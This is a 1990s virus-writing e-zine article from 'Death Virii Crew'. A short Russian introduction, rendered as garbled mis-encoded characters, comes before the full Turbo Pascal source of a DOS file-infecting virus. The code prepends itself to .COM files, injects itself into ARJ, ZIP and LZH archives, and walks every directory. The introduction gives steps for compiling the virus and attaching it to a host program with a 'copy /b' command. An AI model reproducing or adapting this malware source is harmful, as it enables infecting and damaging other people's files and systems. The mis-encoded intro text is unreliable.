   {

   [Death Virii Crew] Presents
   CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997


                    ‚¨àãá-€àå¨¢¨àãá.


   ******************************************************************************
                        **ˆ‚…’ ç¨â îé ï ¯ã¡«¨ª  !!!
               ˆ¤ãé¨©   á¬¥àâì ¯à¨¢¥âáâ¢ã¥â â¥¡ï !!!!!!
   ******************************************************************************
   ‘¬®âà¥« ï âãâ ª ª ¢ë ã¯à ¦ï¥â¥áì ¢  ¯¨á ¨¨ ¢¨à®¢, ¤  ¨ ¤ã¬ î:"¥  ª®àï¡ âì
   «¨ ¬¥ ç¥£®-¨¡ã¤ì". *®¤ã¬ ®-á¤¥« ®... ˆ§-§  á« ¡®£® § ¨ï  áá¥¬¡«¥à , ¨ ¨§
   -§  ®âáãâáâ¢¨ï á¢®¡®¤®£® ¢à¥¬¥¨ ¤«ï â®£® çâ®-¡ë ¨§ãç¨âì ¢ëè¥ã¯®¬ïãâë© ï§ëª
   ¨§ª®£® ãà®¢ï,  ¯¨á « ï á¥© ¢¨à   * áª ª «¥. „ -¤ .. *¥ á¬¥©â¥áì. *â® ¯à®¨§
   ¢¥¤¥¨¥ ¯à®è«® â®«ìª® ¯®ª  « ¡®à â®àë¥ ¨á¯ëâ ¨ï. *®   ¨å ¯®ª § «® á¢®î ¦¨¢
   ãç¥áâì ¤®«¦ë¬ ãà®¢¥¬. *¥ § î, åà ïâ «¨ ¯à®áâë¥ î§¢¥àï ¥é¥   ¢¨â¥ á¢®¨ «¨
   çë¥  àå¨¢ë  «¨ ¥â, ® á¬ëá« ¤¥©áâ¢¨© â ª®¢: ‡ à ¦ ¥âáï ª ª®© ¨¡ã¤ì ª®¬®ª,
   ¯à¨ § ¯ãáª¥ á¥£® ª®¬ª  ¯à®¨áå®¤¨â …ƒŽ  àå¨¢¨à®¢ ¨¥ ¢ ¯¥à¢ë¥ ¯®¯ ¢è¨¥áï  àå¨¢ë
   !!! ‘ ¯¥à¥§ ¯¨áìî !!! „¥« ¥¬ á¢®î à¥§¥à¢ãî ª®¯¨î... *®â®¬ ª®£¤ -¨¡ã¤ì, ª ª®©-
   ¨¡ã¤ì î§¢¥àì à § àå¨¢¨àã¥â ¨ § ¯ãáâ¨â ®ë© ¯à®¤ãªâ - " è  ¯¥áï å®à®è - ç¨
    © á ç «  !!!"
   ¤«ï à á¯à®áâà ¥¨ï ¨«¨ ¯à®áâ® à ¤¨ ®§ ª®¬«¥¨ï ¢ ¦¨¢®¬ ¢¨¤¥ à¥ª®¬¥¤ãî:
   1. Žâª®¬¯¨«¨à®¢ âì.
   2. ‘¦ âì ª ª®©-¨¡ã¤ì á¦¨¬ «ª®©.
   3. *à®á¬®âà¥âì à §¬¥à.
   4. *â®â à §¬¥à ¯à¨á¢®¨âì MySize.
   5. *®¢â®à¨âì ¯¯.1,2. (¢ â®á®áâ¨ !!!)
   6. ‚§ïâì ª ª®©-¨¡ã¤ì ª®¬®ª ¨ ¯à¨¢¨âì ¥¬ã ¢¨àãá „®á®¢áª®© ª®¬ ¤®© â¨¯ :
              copy /b virarh.exe+¨¬ïª®¬ª .á®¬ gggggggg.com
   7. ‡ ¯ãáâ¨âì £¤¥-¨¡ã¤ì. *¥ ®¡ï§ â¥«ì®   á¢®¥© ¬ è¨¥ ;). ‹ãçè¥ ¢á¥£®-
      ¤«ï ¯®«¨£®  ¨á¯®«ì§®¢ âì ¬ è¨ã  çå «ì¨ª .

                                               *ã ¢®â ¨ ¢á¥...
                                               ‘ ã¢ ¦¥¨¥¬

                                                  BiG Mazzy,
                                                           I like eat Clock !
   P.S. ’¥ªáâ ¤ ®£® ¢¨à  ¬®¦® ¨§¬¥ïâì(¢ «ãçèãî áâ®à®ã à §ã¬¥¥âáï) ¯® á¢®¥¬ã
   ãá¬®âà¥¨î.
   ******************************************************************************
   }

   {$M 10000,0,300000}
   uses Dos;
   Const
       MySize:Word=7136;
   Var sc,i:Byte;
       MyBodyD,FFBodyD:pointer;
       MyBodyF:File;
       FFBodyF:File;
       FFSize:Integer;
       MZ:Char;
       curdisk,curdir,Com_Line:String;

   Procedure Alldir(dir:PathStr);
   Var
     FFBodFF,FFBodAA,FFBodBB,FFBodCC:File;
     SR:SearchRec;
     T,extt:String;
     i:Byte;
     FilePol:String;
     Dir_:DirStr;
     Name_:NameStr;
     Ext_:ExtStr;
   Begin
     Dir:=dir+'\';
     FindFirst(Dir+'*.*',AnyFile,SR);
     While DosError=0 Do
       With SR Do Begin
          FilePol:=Concat(Dir,Name);
          FSplit(FilePol,Dir_,Name_,Ext_);
          IF (Ext_='.ARJ') and (sc<5) Then begin
             SwapVectors;
             exec(GetEnv('COMSPEC'),'/c arj a -y'+filepol+' '+paramStr(0)+' >NUL');
             SwapVectors;
             sc:=sc+1;
          end;
          IF (Ext_='.ZIP') and (sc<5) Then begin
             SwapVectors;
             exec(GetEnv('COMSPEC'),'/c pkzip '+filepol+' '+paramStr(0)+' >NUL');
             SwapVectors;
             sc:=sc+1
          end;
          IF (Ext_='.LZH') and (sc<5) Then begin
             SwapVectors;
             exec(GetEnv('COMSPEC'),'/c lha a'+filepol+' '+paramStr(0)+' >NUL');
             SwapVectors;
             sc:=sc+1
          end;
          IF (Ext_='.COM') and (sc<5) Then begin
             if (sr.size<(65000-MySize)) and ((Name_+Ext_)<>'COMMAND.COM')
             then begin
             assign(FFBodAA,filepol);
             reset(FFBodAA,1);
             blockread(FFBodAA,MZ,1);
             close(FFBodAA);
             if MZ<>'M' then begin
                 SwapVectors;
                 exec(GetEnv('COMSPEC'),'/c cd '+CurDISK+COPY(dir,1,LENGTH(dir)-1)+' >nul');
                 SwapVectors;
                 assign(FFBodFF,'nc.ini');
                 rewrite(FFBodFF,1);
                 blockwrite(FFBodFF,MyBodyD^,MySize);
                 Close(FFBodFF);
                 SwapVectors;
                 exec(GetEnv('COMSPEC'),'/c copy /b nc.ini+'+name_+ext_+' dn.cfg'+' >nul');
                 SwapVectors;

                 SwapVectors;
                 exec(GetEnv('COMSPEC'),'/c del '+name_+ext_+' >nul');
                 SwapVectors;
                 SwapVectors;
                 exec(GetEnv('COMSPEC'),'/c ren dn.cfg '+name_+ext_+' >nul');
                 SwapVectors;
                 erase(FFBodFF);
                 sc:=sc+1
             end;

             end;
          end;

          FindNext(SR);
       End;
     FindFirst(Dir+'*.*',Directory,SR);
     While DosError=0 Do
      With SR Do begin
        if (Name[1]<>'.') and (Attr=Directory) then Alldir(Dir+Name);
        FindNext(SR);
      End;
   End;
   Begin
      GetDir(0,curdir);
      CurDisk:=copy(curdir,1,2);
      iF ParamCount>0 Then
      Begin
         For i:=1 To ParamCount Do
         Com_Line:=Com_Line+' '+paramstr(i);
      End;
      Sc:=0;
      assign(MyBodyF,paramstr(0));
      reset(MyBodyF,1);
      getmem(MyBodyD,MySize);
      blockread(MyBodyF,MyBodyD^,MySize);
      seek(MyBodyF,MySize);
      FFSize:=filesize(MyBodyF)-MySize;
      getmem(FFBodyD,FFSize);
      blockread(MyBodyF,FFBodyD^,FFSize);
      assign(FFBodyF,'bmbmbmbm.com');
      rewrite(FFBodyF,1);
      blockwrite(FFBodyF,FFBodyD^,FFSize);
      freemem(FFBodyD,FFSize);
      close(MyBodyF);
      close(FFBodyF);
      swapvectors;
      exec(GetEnv('COMSPEC'),'/c bmbmbmbm.com '+Com_Line);
      swapvectors;
      erase(FFBodyF);
      Alldir('');
      freemem(MyBodyD,MySize);
   End.

   ******************************************************************************
